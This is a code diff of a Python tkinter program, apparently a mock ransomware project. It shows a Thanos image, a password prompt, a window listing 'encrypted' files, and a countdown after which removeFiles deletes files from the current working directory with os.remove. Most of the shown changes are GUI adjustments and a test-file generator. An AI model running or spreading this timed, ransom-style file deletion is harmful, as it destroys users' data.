@@ -53,7 +53,7 @@ class MyTk:
         self.pwbutton.pack()
 
         self.thanos = tkinter.PhotoImage(file="../ui/face.png")
-        self.l_thanos = tkinter.Label(self.window, image=self.thanos)
+        self.l_thanos = tkinter.Label(self.window, image=self.thanos,borderwidth=0,compound="center",highlightthickness = 0)
         self.l_thanos.pack()
 
     def keySubmit(self):
@@ -115,6 +115,12 @@ def startTimer(gui, path, ext=None):
             else:
                 continue
 
+    if len(antdd_filelist)==0:
+        print("파일이 존재하지 않습니다")
+        allRemovePrint(gui)
+        return
+
+
     # gui/ 삭제될 파일 리스트 출력
     # gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
     # 지운 파일 출력 #새창으로 띄우기
@@ -122,18 +128,21 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.title('암호화된 파일 리스트(남은 파일 리스트)')
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
-
-    gui.list = tkinter.Label(gui.listWindow, text="[" + ",\n".join(antdd_filelist) + "]", background="black", fg="red")
+    gui.list = tkinter.Label(gui.listWindow, text='\n'.join(['['+x+']' for x in antdd_filelist]), background="black", fg="red",
+                             font='Helvetica 14 bold')
+    gui.listWindow.lift()
     gui.list.pack()
     ###
     print("[" + ",".join(antdd_filelist) + "]")
 
     clock(gui, 5, antdd_filelist)
 
+    '''
     ### list gui 자동으로 삭제 ###
     sleep(3)
     gui.listWindow.destroy()
     ###
+    '''
 
 
 # 타이머를 출력해주는 함수
@@ -187,18 +196,16 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     elif (len(remove_filelist) == 1):
         os.remove(remove_filelist[0])
         print("더 이상 삭제할 파일이 없습니다")
-        allRemovePrint(gui)
-    # 맨 처음 파일이 0개일 경우
-    else:
-        print("더 이상 삭제할 파일이 없습니다")
+        gui.listWindow.destroy()
         allRemovePrint(gui)
 
-    # gui
-    sleep(2)
 
     gui.l_thanos.pack_forget()
-    gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos)
+    gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos, borderwidth=0, compound="center", highlightthickness=0)
     gui.l_thanos.pack()
+
+    # 창 띄운 거 닫음
+    gui.listWindow.destroy()
 
     # 다시 타이머함수 시작!
     startTimer(gui, os.getcwd())
@@ -345,5 +352,11 @@ class RealMain:
 
 
 if __name__ == "__main__":
+
+    # 테스트용 파일 생성하기...(복붙너무귀찮아서...)
+    for i in range(1):
+        with open("test" + str(i) + '.txt', 'wb') as testfile:
+            testfile.write('테스트입니다'.encode())
+
     r = RealMain()
     r.run()
